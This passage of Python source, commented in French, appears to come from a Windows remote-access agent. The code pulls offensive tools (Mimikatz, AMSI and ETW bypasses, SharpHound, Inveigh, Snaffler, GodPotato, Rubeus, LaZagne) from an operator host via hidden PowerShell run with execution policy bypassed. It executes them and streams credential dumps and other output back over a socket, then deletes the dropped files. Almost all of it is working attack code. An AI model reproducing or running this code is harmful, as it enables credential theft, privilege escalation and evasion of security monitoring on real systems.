        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)  
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADPWSHMODULE] winPEAS module loaded.\n" + chariot)
    elif module_name == "bloodhound":
        global bloodhoundtodelete, bloodhoundtoexecute
        bloodhoundtodelete = current_path + "\\SHARPHOUND\\"
        bloodhoundtoexecute = current_path + "\\SHARPHOUND\\SharpHound.ps1" # to be modified
        payload = f"""
        New-Item -Path "$(get-location)/SHARPHOUND" -ItemType Directory -Force
        $url = "http://{myip}/download/SHARPHOUND/SharpHound.ps1"
        $destination = "$(get-location)/SHARPHOUND/SharpHound.ps1"
        Invoke-WebRequest -Uri $url -OutFile $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADPWSHMODULE] BloodHound module loaded.\n" + chariot)
    elif module_name == "byovd":
        global byovdtodelete, byovdtoexecute
        byovdtodelete = current_path + "\\BYOVD\\"
        byovdtoexecute = current_path + "\\BYOVD\\BYOVDriver_Checker.ps1"
        payload = f"""
        New-Item -Path "$(get-location)/BYOVD" -ItemType Directory -Force
        $url = "http://{myip}/download/BYOVD/BYOVDriver_Checker.ps1"
        $destination = "$(get-location)/BYOVD/BYOVDriver_Checker.ps1"
        Invoke-WebRequest -Uri $url -OutFile $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADPWSHMODULE] BYOVD Checker module loaded.\n" + chariot)
    elif module_name == "sauroneye":
        global sauroneyetodelete, sauroneyetoexecute
        sauroneyetodelete = current_path + "\\SAURONEYE\\"
        sauroneyetoexecute = current_path + "\\SAURONEYE\\Invoke-SauronEye.ps1"
        payload = f"""
        New-Item -Path "$(get-location)/SAURONEYE" -ItemType Directory -Force
        $url = "http://{myip}/download/SAURONEYE/pwsh/Invoke-SauronEye.ps1"
        $destination = "$(get-location)/SAURONEYE/Invoke-SauronEye.ps1"
        Invoke-WebRequest -Uri $url -OutFile $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADPWSHMODULE] SauronEye module loaded.\n" + chariot)
    elif module_name == "inveigh":
        global inveightodelete, inveightoexecute
        inveightodelete = current_path + "\\INVEIGH\\"
        inveightoexecute = current_path + "\\INVEIGH\\Invoke-Inveigh.ps1"
        payload = f"""
        New-Item -Path "$(get-location)/INVEIGH" -ItemType Directory -Force
        $url = "http://{myip}/download/INVEIGH/pwsh/Invoke-Inveigh.ps1"
        $destination = "$(get-location)/INVEIGH/Invoke-Inveigh.ps1"
        Invoke-WebRequest -Uri $url -OutFile $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADPWSHMODULE] Inveigh module loaded.\n" + chariot)
    elif module_name == "snaffler":
        global snafflertodelete, snafflertoexecute
        snafflertodelete = current_path + "\\SNAFFLER\\"
        snafflertoexecute = current_path + "\\SNAFFLER\\Invoke-Snaffler.ps1"
        payload = f"""
        New-Item -Path "$(get-location)/SNAFFLER" -ItemType Directory -Force
        $url = "http://{myip}/download/SNAFFLER/pwsh/Invoke-Snaffler.ps1"
        $destination = "$(get-location)/SNAFFLER/Invoke-Snaffler.ps1"
        Invoke-WebRequest -Uri $url -OutFile $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADPWSHMODULE] Snaffler module loaded.\n" + chariot)
    elif module_name == "godpotato":
        global godpotatotodelete, godpotatotoexecute
        godpotatotodelete = current_path + "\\GODPOTATO\\"
        godpotatotoexecute = current_path + "\\GODPOTATO\\Invoke-GodPotato.ps1"
        payload = f"""
        New-Item -Path "$(get-location)/GODPOTATO" -ItemType Directory -Force
        $url = "http://{myip}/download/GODPOTATO/pwsh/Invoke-GodPotato.ps1"
        $destination = "$(get-location)/GODPOTATO/Invoke-GodPotato.ps1"
        Invoke-WebRequest -Uri $url -OutFile $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADPWSHMODULE] GodPotato module loaded.\n" + chariot)
    

def Load_Obf_Pwsh_Module(module_name, module_args=""):
    current_path = os.getcwd()
    if module_name == "all":
        s.send(chariot + f"[LOADOBFPWSHMODULE] Loading ALL obfuscated PWSH modules ...\n".encode('utf-8'))
        Load_Obf_Pwsh_Module("mimikatz")
        Load_Obf_Pwsh_Module("amsi")
        Load_Obf_Pwsh_Module("etw")
        Load_Obf_Pwsh_Module("bloodhound")
        Load_Obf_Pwsh_Module("sauroneye")
        Load_Obf_Pwsh_Module("inveigh")
        s.send(chariot + b"[LOADOBFPWSHMODULE] All obfuscated PWSH modules loaded.\n" + chariot)
    elif module_name == "mimikatz":
        global mimikatztoexecute, mimikatztodelete
        mimikatztodelete = current_path + "\\MIMIKATZ\\"
        mimikatztoexecute = current_path + "\\MIMIKATZ\\Obf-Invoke-Jinx.ps1"
        payload = f"""
        New-Item -Path "$(get-location)/MIMIKATZ" -ItemType Directory -Force
        $url = "http://{myip}/download/MIMIKATZ/obf-pwsh/Obf-Invoke-Jinx.ps1"
        $destination = "$(get-location)/MIMIKATZ/Obf-Invoke-Jinx.ps1"
        Invoke-WebRequest -Uri $url -OutFile $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADOBFPWSHMODULE] Obfuscated Mimikatz module loaded.\n" + chariot)
    elif module_name == "amsi":
        global amsitodelete, amsitoexecute
        amsitodelete = current_path + "\\AMSI\\"
        amsitoexecute = current_path + "\\AMSI\\obfamsibypass.ps1"
        payload = f"""
        New-Item -Path "$(get-location)/AMSI" -ItemType Directory -Force
        $url = "http://{myip}/download/AMSI/obf-pwsh/obfamsibypass.ps1"
        $destination = "$(get-location)/AMSI/obfamsibypass.ps1"
        Invoke-WebRequest -Uri $url -OutFile $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADOBFPWSHMODULE] Obfuscated AMSI Bypass module loaded.\n" + chariot)
    elif module_name == "etw":
        global etwtodelete, etwtoexecute
        etwtodelete = current_path + "\\ETW\\"
        etwtoexecute = current_path + "\\ETW\\obfetwbypass.ps1"
        payload = f"""
        New-Item -Path "$(get-location)/ETW" -ItemType Directory -Force
        $url = "http://{myip}/download/ETW/obf-pwsh/obfetwbypass.ps1"
        $destination = "$(get-location)/ETW/obfetwbypass.ps1"
        Invoke-WebRequest -Uri $url -OutFile $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADOBFPWSHMODULE] Obfuscated ETW Bypass module loaded.\n" + chariot)
    elif module_name == "bloodhound":
        global bloodhoundtodelete, bloodhoundtoexecute
        bloodhoundtodelete = current_path + "\\SHARPHOUND\\"
        bloodhoundtoexecute = current_path + "\\SHARPHOUND\\Obf-Invoke-Jinxhound.ps1" # to be modified
        payload = f"""
        New-Item -Path "$(get-location)/SHARPHOUND" -ItemType Directory -Force
        $url = "http://{myip}/download/SHARPHOUND/obf-pwsh/Obf-Invoke-Jinxhound.ps1"
        $destination = "$(get-location)/SHARPHOUND/Obf-Invoke-Jinxhound.ps1"
        Invoke-WebRequest -Uri $url -OutFile $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADOBFPWSHMODULE] Obfuscated BloodHound module loaded.\n" + chariot)
    elif module_name == "sauroneye":
        global sauroneyetodelete, sauroneyetoexecute
        sauroneyetodelete = current_path + "\\SAURONEYE\\"
        sauroneyetoexecute = current_path + "\\SAURONEYE\\Obf-Invoke-Jinxoneye.ps1"
        payload = f"""
        New-Item -Path "$(get-location)/SAURONEYE" -ItemType Directory -Force
        $url = "http://{myip}/download/SAURONEYE/obf-pwsh/Obf-Invoke-Jinxoneye.ps1"
        $destination = "$(get-location)/SAURONEYE/Obf-Invoke-Jinxoneye.ps1"
        Invoke-WebRequest -Uri $url -OutFile $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADOBFPWSHMODULE] Obfuscated SauronEye module loaded.\n" + chariot)
    elif module_name == "inveigh":
        global inveightodelete, inveightoexecute
        inveightodelete = current_path + "\\INVEIGH\\"
        inveightoexecute = current_path + "\\INVEIGH\\Obf-Invoke-Jinxveigh.ps1"
        payload = f"""
        New-Item -Path "$(get-location)/INVEIGH" -ItemType Directory -Force
        $url = "http://{myip}/download/INVEIGH/obf-pwsh/Obf-Invoke-Jinxveigh.ps1"
        $destination = "$(get-location)/INVEIGH/Obf-Invoke-Jinxveigh.ps1"
        Invoke-WebRequest -Uri $url -OutFile $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADOBFPWSHMODULE] Obfuscated Inveigh module loaded.\n" + chariot)


# Supprime les modules externes précédemment téléchargés
def Remove_Module(module_name):
    if module_name == "all":
        s.send(chariot + f"[REMOVEMODULE] Removing ALL modules...\n".encode('utf-8'))
        if globals().get("mimikatztodelete"):
            Remove_Module("mimikatz")
        if globals().get("rubeustodelete"):
            Remove_Module("rubeus")
        if globals().get("lazagnetodelete"):
            Remove_Module("lazagne")
        if globals().get("kekeotodelete"):
            Remove_Module("kekeo")
        if globals().get("sauroneyetodelete"):
            Remove_Module("sauroneye")
        if globals().get("powersploittodelete"):
            Remove_Module("powersploit")
        if globals().get("winpeastodelete"):
            Remove_Module("winpeas")
        if globals().get("bloodhoundtodelete"):
            Remove_Module("bloodhound")
        if globals().get("amsitodelete"):
            Remove_Module("amsi")
        if globals().get("etwtodelete"):
            Remove_Module("etw")
        if globals().get("byovdtodelete"):
            Remove_Module("byovd")
        if globals().get("sauroneyetodelete"):
            Remove_Module("sauroneye")
        if globals().get("inveightodelete"):
            Remove_Module("inveigh")
        if globals().get("snafflertodelete"):
            Remove_Module("snaffler")
        if globals().get("godpotatotodelete"):
            Remove_Module("godpotato")
        s.send(chariot + b"[REMOVEMODULE] All modules removed.\n" + chariot)
    elif module_name == "mimikatz":
        shutil.rmtree(mimikatztodelete, ignore_errors=False)
        s.send(chariot + b"[REMOVEMODULE] Mimikatz module removed.\n" + chariot)
    elif module_name == "powersploit":
        shutil.rmtree(powersploittodelete, ignore_errors=False)
        s.send(chariot + b"[REMOVEMODULE] PowerSploit module removed.\n" + chariot)
    elif module_name == "rubeus":
        shutil.rmtree(rubeustodelete, ignore_errors=False)
        s.send(chariot + b"[REMOVEMODULE] Rubeus module removed.\n" + chariot)
    elif module_name == "lazagne":
        shutil.rmtree(lazagnetodelete, ignore_errors=False)
        s.send(chariot + b"[REMOVEMODULE] LaZagne module removed.\n" + chariot)
    elif module_name == "kekeo":
        shutil.rmtree(kekeotodelete, ignore_errors=False)
        s.send(chariot + b"[REMOVEMODULE] Kekeo module removed.\n" + chariot)
    elif module_name == "winpeas":
        shutil.rmtree(winpeastodelete, ignore_errors=False)
        s.send(chariot + b"[REMOVEMODULE] winPEAS module removed.\n" + chariot)
    elif module_name == "bloodhound":
        shutil.rmtree(bloodhoundtodelete, ignore_errors=False)
        s.send(chariot + b"[REMOVEMODULE] BloodHound module removed.\n" + chariot)
    elif module_name == "amsi":
        shutil.rmtree(amsitodelete, ignore_errors=False)
        s.send(chariot + b"[REMOVEMODULE] AMSI Bypass module removed.\n" + chariot)
    elif module_name == "etw":
        shutil.rmtree(etwtodelete, ignore_errors=False)
        s.send(chariot + b"[REMOVEMODULE] ETW Bypass module removed.\n" + chariot)
    elif module_name == "byovd":
        shutil.rmtree(byovdtodelete, ignore_errors=False)
        s.send(chariot + b"[REMOVEMODULE] BYOVD Checker module removed.\n" + chariot)
    elif module_name == "sauroneye":
        shutil.rmtree(sauroneyetodelete, ignore_errors=False)
        s.send(chariot + b"[REMOVEMODULE] SauronEye module removed.\n" + chariot)
    elif module_name == "inveigh":
        shutil.rmtree(inveightodelete, ignore_errors=False)
        s.send(chariot + b"[REMOVEMODULE] Inveigh module removed.\n" + chariot)
    elif module_name == "snaffler":
        shutil.rmtree(snafflertodelete, ignore_errors=False)
        s.send(chariot + b"[REMOVEMODULE] Snaffler module removed.\n" + chariot)
    elif module_name == "godpotato":
        shutil.rmtree(godpotatotodelete, ignore_errors=False)
        s.send(chariot + b"[REMOVEMODULE] GodPotato module removed.\n" + chariot)
# Exécute un module externe chargé (sessions interactives pour mimikatz/kekeo)
def Run_Module(module_name, module_args=""):
    current_path = os.getcwd()
    if module_name == "mimikatz":
        exe_path = mimikatztoexecute
        if not exe_path or not os.path.isfile(exe_path):
            s.send(f"[!] mimikatz.exe introuvable. Charge d'abord le module.\n".encode('utf-8'))
            return

        s.send(chariot + b"[MIMIKATZ] Demarrage de la session interactive...\n")
        s.send(b"[MIMIKATZ] Tape 'exit' pour quitter la session et revenir au shell.\n")

        try:
            proc = subprocess.Popen(
                [exe_path],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT, 
                shell=False,
                bufsize=0,                  
                universal_newlines=False,   
                creationflags=CREATE_NO_WINDOW
            )
        except Exception as e:
            s.send(f"[MIMIKATZ] Echec de lancement: {e}\n".encode('utf-8', 'replace'))
            return

        stop_evt = threading.Event()

        def pump_stdout():
            try:
                while not stop_evt.is_set():
                    chunk = proc.stdout.read(1024)
                    if not chunk:
                        break
                    try:
                        s.send(chunk)
                    except Exception:
                        break
            except Exception:
                pass

        t_out = threading.Thread(target=pump_stdout, daemon=True)
        t_out.start()

        try:
            while True:

                if proc.poll() is not None:
                    break

                data = s.recv(4096)
                if not data:
                    sleep(0.05)
                    continue

                try:
                    text = data.decode('utf-8', 'replace')
                except Exception:
                    text = ''

                if text.strip().lower() == "exit":
                    try:
                        proc.stdin.write(b"exit\r\n")
                        proc.stdin.flush()
                    except Exception:
                        pass
                    # on attend un court instant la fin du process
                    try:
                        proc.wait(timeout=3)
                    except Exception:
                        pass
                    break

                norm = text.replace('\r\n', '\n').replace('\r', '\n').replace('\n', '\r\n').encode('utf-8', 'replace')
                try:
                    proc.stdin.write(norm)
                    proc.stdin.flush()
                except BrokenPipeError:
                    break
                except Exception:
                    pass

        finally:
            stop_evt.set()
            try:
                t_out.join(timeout=1.0)
            except Exception:
                pass
            try:
                if proc.poll() is None:
                    proc.terminate()
            except Exception:
                pass

        s.send(b"\n[RUBEUS] Session interactive terminee. Retour au shell.\n" + chariot)
    elif module_name == "rubeus":
        exe_path = rubeustoexecute
        s.send(chariot + b"[RUBEUS] Running Rubeus...\n")
        
        if not exe_path or not os.path.isfile(exe_path):
            s.send(b"[!] Rubeus.exe introuvable. Charge d'abord le module.\n")
            return

        try:
            parsed_args = shlex.split(module_args, posix=False) if module_args else []
        except Exception as e:
            s.send(f"[!] Error parsing Rubeus arguments: {e}\n".encode("utf-8", "replace"))
            return

        cmd = [exe_path] + parsed_args

        try:
            proc = subprocess.Popen(
                cmd,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                shell=False,
                universal_newlines=False,
                creationflags=CREATE_NO_WINDOW
            )

            output, _ = proc.communicate()

            if output:
                s.send(output)
            else:
                s.send(b"[RUBEUS] Command executed with no output.\n")

        except Exception as e:
            s.send(f"[RUBEUS] Echec de lancement: {e}\n".encode("utf-8", "replace"))
            return

    elif module_name == "lazagne":
        s.send(chariot + b"[LAZAGNE] Running LaZagne to retrieve stored passwords...\n")
        if lazagnetoexecute is not None:
            results = subprocess.Popen([lazagnetoexecute, "all"], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output = results.stdout.read() + results.stderr.read()
            s.send(chariot + output + chariot)
    elif module_name == "kekeo":
        return
        exe_path = kekeotoexecute
        if not exe_path or not os.path.isfile(exe_path):
            s.send(f"[!] kekeo.exe introuvable: {exe_path}\n".encode("utf-8", errors="ignore"))
            return

        s.send(chariot + b"[KEKEO] Demarrage de la session interactive...\n")
        s.send(b"[KEKEO] Tape 'exit' pour quitter la session et revenir au shell.\n")
        ####### IMPOSSIBLE SANS PATCH DE LA DLL de PYWINPTY ########
    elif module_name == "sauroneye":
        s.send(chariot + b"[SAURONEYE] Running SauronEye to check for specific keywords...\n")
        exe_path = sauroneyetoexecute
        if not exe_path or not os.path.isfile(exe_path):
            s.send(f"[!] SauronEye.exe introuvable: {exe_path}\n".encode("utf-8", errors="ignore"))
            return
        try:
            parsed_args = shlex.split(module_args, posix=False) if module_args else []
        except Exception as e:
            s.send(f"[!] Error parsing SauronEye arguments: {e}\n".encode("utf-8", "replace"))
            return

        cmd = [exe_path] + parsed_args

        if sauroneyetoexecute is not None:
            results = subprocess.Popen(cmd, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output = results.stdout.read() + results.stderr.read()
            s.send(chariot + output + chariot)
    elif module_name == "inveigh": # surely not working
        s.send(chariot + b"[INVEIGH] Running Inveigh to capture network traffic...\n")
        exe_path = inveightoexecute
        if not exe_path or not os.path.isfile(exe_path):
            s.send(f"[!] Inveigh.exe introuvable: {exe_path}\n".encode("utf-8", errors="ignore"))
            return
        try:
            parsed_args = shlex.split(module_args, posix=False) if module_args else []
        except Exception as e:
            s.send(f"[!] Error parsing Inveigh arguments: {e}\n".encode("utf-8", "replace"))
            return

        cmd = [exe_path] + parsed_args

        try:
            proc = subprocess.Popen(
                cmd,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                shell=False,
                universal_newlines=False,
                creationflags=CREATE_NO_WINDOW
            )

            output, _ = proc.communicate()

            if output:
                s.send(output)
            else:
                s.send(b"[INVEIGH] Command executed with no output.\n")

        except Exception as e:
            s.send(f"[INVEIGH] Echec de lancement: {e}\n".encode("utf-8", "replace"))
            return
    elif module_name == "snaffler":
        s.send(chariot + b"[SNAFFLER] Running Snaffler to ...\n")
        exe_path = snafflertoexecute
        if not exe_path or not os.path.isfile(exe_path):
            s.send(f"[!] Snaffler.exe introuvable: {exe_path}\n".encode("utf-8", errors="ignore"))
            return
        try:
            parsed_args = shlex.split(module_args, posix=False) if module_args else []
        except Exception as e:
            s.send(f"[!] Error parsing Snaffler arguments: {e}\n".encode("utf-8", "replace"))
            return

        cmd = [exe_path] + parsed_args

        try:
            proc = subprocess.Popen(
                cmd,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                shell=False,
                universal_newlines=False,
                creationflags=CREATE_NO_WINDOW
            )

            output, _ = proc.communicate()

            if output:
                s.send(output)
            else:
                s.send(b"[SNAFFLER] Command executed with no output.\n")

        except Exception as e:
            s.send(f"[SNAFFLER] Echec de lancement: {e}\n".encode("utf-8", "replace"))
            return
    elif module_name == "godpotato":
        s.send(chariot + b"[GODPOTATO] Running GodPotato to attempt privilege escalation...\n")
        match module_args:
            case "net2":
                exe_path = f"{godpotatotoexecute}-NET2.exe"
            case "net35":
                exe_path = f"{godpotatotoexecute}-NET35.exe"
            case "net4":
                exe_path = f"{godpotatotoexecute}-NET4.exe"
            case _:
                exe_path = f"{godpotatotoexecute}-NET4.exe"
        if not exe_path or not os.path.isfile(exe_path):
            s.send(f"[!] GodPotato.exe introuvable: {exe_path}\n".encode("utf-8", errors="ignore"))
            return
        try:
            parsed_args = shlex.split(module_args, posix=False) if module_args else []
        except Exception as e:
            s.send(f"[!] Error parsing GodPotato arguments: {e}\n".encode("utf-8", "replace"))
            return

        cmd = [exe_path] + parsed_args

        try:
            proc = subprocess.Popen(
                cmd,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                shell=False,
                universal_newlines=False,
                creationflags=CREATE_NO_WINDOW
            )

            output, _ = proc.communicate()

            if output:
                s.send(output)
            else:
                s.send(b"[GODPOTATO] Command executed with no output.\n")

        except Exception as e:
            s.send(f"[GODPOTATO] Echec de lancement: {e}\n".encode("utf-8", "replace"))
            return

def Run_Pwsh_Module(module_name, module_args=""):   
    global powershell_proc
    current_path = os.getcwd()
    s.send(f"[DEBUG] module_name={module_name!r} module_args={module_args!r}\n".encode("utf-8", "replace"))
    if module_name == "winpeas":
        s.send(chariot + b"[WINPEAS] Running winPEAS to enumerate possible privilege escalations...\n")
        s.send(b"[WINPEAS] This may take several minutes - streaming output in real-time...\n" + chariot)
        if winpeastoexecute is not None:
            payload = f"""$path = "{winpeastoexecute}";& $path"""
            proc = subprocess.Popen(
                ["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], 
                stdout=subprocess.PIPE, 
                stdin=subprocess.PIPE, 
                stderr=subprocess.STDOUT,  # Fusionner stderr dans stdout pour tout capturer
                creationflags=CREATE_NO_WINDOW,
                bufsize=1,  # Line buffered
                universal_newlines=False
            )
            
            # Lecture et envoi en temps réel
            while True:
                chunk = proc.stdout.read(4096)  # Lire par chunks de 4KB
                if not chunk and proc.poll() is not None:
                    break
                if chunk:
                    try:
                        s.send(chunk)
                    except Exception:
                        break
            
            proc.wait()  # Attendre la fin propre du processus
        else:
            s.send(b"[WINPEAS] winPEAS.ps1 not found. Load the module first.\n")
        s.send(chariot + b"[WINPEAS] winPEAS execution done.\n" + chariot)
    elif module_name == "bloodhound":
        s.send(chariot + b"[BLOODHOUND] Running BloodHound enumeration...\n")
        if bloodhoundtoexecute is not None:
            payload = f"""
            $path = "{bloodhoundtoexecute}"
            . $path
            Invoke-BloodHound
            remove-item ./*.bin -Force
            """
        else:
            payload = f"""
            $path = "{current_path}\\SHARPHOUND\\SharpHound.ps1"
            . $path
            Invoke-BloodHound -CollectionMethods all -OutputDirectory $pwd '{module_args}'
            remove-item ./*.bin -Force
            """
        if powershell_proc and powershell_proc.poll() is None:
            try:
                results = subprocess.Popen(
                    ["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], 
                    stdout=subprocess.PIPE, 
                    stdin=subprocess.PIPE, 
                    stderr=subprocess.PIPE,
                    creationflags=CREATE_NO_WINDOW
                )
                output = results.stdout.read() + results.stderr.read()
                s.send(chariot + f"[BLOODHOUND] BloodHound done\n".encode('utf-8') + chariot)
            except Exception as e:
                s.send(f"[BLOODHOUND] Error: {e}\n".encode('utf-8'))
    
    elif module_name == "byovd":
        s.send(chariot + b"[BYOVD] Running BYOVD Checker...\n")
        if byovdtoexecute is not None:
            payload = f"""$path = "{byovdtoexecute}";& $path"""
        else:
            payload = f"""$path = "{current_path}\\BYOVD\\BYOVDriver_Checker.ps1";& $path"""
        if powershell_proc and powershell_proc.poll() is None:
            try:
                powershell_proc.stdin.write(payload.encode('utf-8') + b"\r\n")
                powershell_proc.stdin.flush()
            except Exception as e:
                s.send(f"[BYOVD] Error: {e}\n".encode('utf-8'))
        else:
            s.send(b"[!POWERSHELL] No active PowerShell session. Use 'powershell' first.\n")
        s.send(chariot + b"[BYOVD] BYOVD Checker done.\n" + chariot)
    elif module_name == "sauroneye":
        s.send(chariot + b"[SAURONEYE] Running SauronEye to check for specific keywords...\n")
        if sauroneyetoexecute is not None:
            payload = f"""$path = "{sauroneyetoexecute}";. $path; Invoke-SauronEye {module_args}"""
        else:
            payload = f"""$path = "{current_path}\\SAURONEYE\\Invoke-SauronEye.ps1";. $path; Invoke-SauronEye {module_args}"""
        if powershell_proc and powershell_proc.poll() is None:
            try:
                powershell_proc.stdin.write(payload.encode('utf-8') + b"\r\n")
                powershell_proc.stdin.flush()
            except Exception as e:
                s.send(f"[SAURONEYE] Error: {e}\n".encode('utf-8'))
        else:
            s.send(b"[!POWERSHELL] No active PowerShell session. Use 'powershell' first.\n")
        s.send(chariot + b"[SAURONEYE] SauronEye execution done.\n" + chariot)
    elif module_name == "mimikatz":
        s.send(chariot + b"[MIMIKATZ] Running Mimikatz to retrieve credentials...\n")
        if module_args.strip() == "":
            module_args = "::"
        if mimikatztoexecute is not None:
            payload = f"""$path = "{mimikatztoexecute}";. $path; Invoke-Mimikatz -Command '{module_args}'"""
        else:
            payload = f"""$path = "{current_path}\\Invoke-Mimikatz.ps1";. $path; Invoke-Mimikatz -Command '{module_args}'"""
        if powershell_proc and powershell_proc.poll() is None:
            try:
                powershell_proc.stdin.write(payload.encode('utf-8') + b"\r\n")
                powershell_proc.stdin.flush()
            except Exception as e:
                s.send(f"[MIMIKATZ] Error: {e}\n".encode('utf-8'))
        else:
            s.send(b"[!POWERSHELL] No active PowerShell session. Use 'powershell' first.\n")

    elif module_name == "rubeus":
        s.send(chariot + b"[RUBEUS] Running Rubeus to interact with Kerberos tickets...\n")
        if module_args.strip() == "":
            module_args = "help"
        if rubeustoexecute is not None:
            payload = f"""$path = "{rubeustoexecute}";. $path; Invoke-Rubeus -Command '{module_args}'"""
        else:
            payload = f"""$path = "{current_path}\\Invoke-Rubeus.ps1";. $path; Invoke-Rubeus -Command '{module_args}'"""
        if powershell_proc and powershell_proc.poll() is None:
            try:
                powershell_proc.stdin.write(payload.encode('utf-8') + b"\r\n")
                powershell_proc.stdin.flush()
            except Exception as e:
                s.send(f"[RUBEUS] Error: {e}\n".encode('utf-8'))
        else:
            s.send(b"[!POWERSHELL] No active PowerShell session. Use 'powershell' first.\n")
    elif module_name == "inveigh":
        s.send(chariot + b"[INVEIGH] Running Inveigh to capture network traffic...\n")
        if inveightoexecute is not None:
            payload = f"""$path = "{inveightoexecute}";. $path; Invoke-Inveigh {module_args}"""
        else:
            payload = f"""$path = "{current_path}\\Invoke-Inveigh.ps1";. $path; Invoke-Inveigh {module_args}"""
        if powershell_proc and powershell_proc.poll() is None:
            try:
                powershell_proc.stdin.write(payload.encode('utf-8') + b"\r\n")
                powershell_proc.stdin.flush()
            except Exception as e:
                s.send(f"[INVEIGH] Error: {e}\n".encode('utf-8'))
        else:
            s.send(b"[!POWERSHELL] No active PowerShell session. Use 'powershell' first.\n")
        s.send(chariot + b"[INVEIGH] Inveigh execution done.\n" + chariot)
    elif module_name == "snaffler":
        s.send(chariot + b"[SNAFFLER] Running Snaffler to capture credentials from memory...\n")
        if snafflertoexecute is not None:
            payload = f"""$path = "{snafflertoexecute}";. $path; Invoke-Snaffler -Command '{module_args}'"""
        else:
            payload = f"""$path = "{current_path}\\Invoke-Snaffler.ps1";. $path; Invoke-Snaffler -Command '{module_args}'"""
        if powershell_proc and powershell_proc.poll() is None:
            try:
                powershell_proc.stdin.write(payload.encode('utf-8') + b"\r\n")
                powershell_proc.stdin.flush()
            except Exception as e:
                s.send(f"[SNAFFLER] Error: {e}\n".encode('utf-8'))
        else:
            s.send(b"[!POWERSHELL] No active PowerShell session. Use 'powershell' first.\n")
        s.send(chariot + b"[SNAFFLER] Snaffler execution done.\n" + chariot)
    elif module_name == "godpotato":
        s.send(chariot + b"[GODPOTATO] Running GodPotato to check for potential Privilege Escalation...\n")
        if godpotatotoexecute is not None:
            payload = f"""$path = "{godpotatotoexecute}";. $path; Invoke-GodPotato {module_args}"""
        else:
